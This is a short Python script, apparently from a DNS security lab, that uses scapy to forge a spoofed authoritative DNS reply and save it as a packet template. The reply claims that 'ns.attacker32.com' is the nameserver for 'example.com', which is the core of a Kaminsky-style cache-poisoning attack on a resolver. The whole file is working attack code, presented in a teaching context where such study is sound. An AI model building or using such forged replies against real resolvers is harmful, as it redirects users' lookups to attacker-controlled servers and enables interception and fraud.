"""
this file contains the build of DNS reply packet

:authors: Lior Vinman & Yoad Tamar

:since: 31/05/2023
"""

import scapy.all as scapy


def generate_reply() -> bytes:
    name = "twysw.example.com"
    domain = "example.com"
    ns = "ns.attacker32.com"

    Qdsec = scapy.DNSQR(qname=name)
    Anssec = scapy.DNSRR(rrname=name, type="A", rdata="1.2.3.4", ttl=259200)
    NSsec = scapy.DNSRR(rrname=domain, type="NS", rdata=ns, ttl=259200)

    ip = scapy.IP(dst="10.9.0.53", src="8.1.2.3", chksum=0)
    udp = scapy.UDP(sport=53, dport=33333, chksum=0)
    dns = scapy.DNS(id=0xAAAA, aa=1, ra=0, rd=0, cd=0, qr=1,
                    qdcount=1, ancount=1, nscount=1, arcount=0,
                    qd=Qdsec, an=Anssec, ns=NSsec)

    dns_reply = ip / udp / dns

    return bytes(dns_reply)


def main():
    pkt = generate_reply()

    with open("dns_rep.bin", "wb") as file:
        file.write(pkt)


if __name__ == "__main__":
    main()
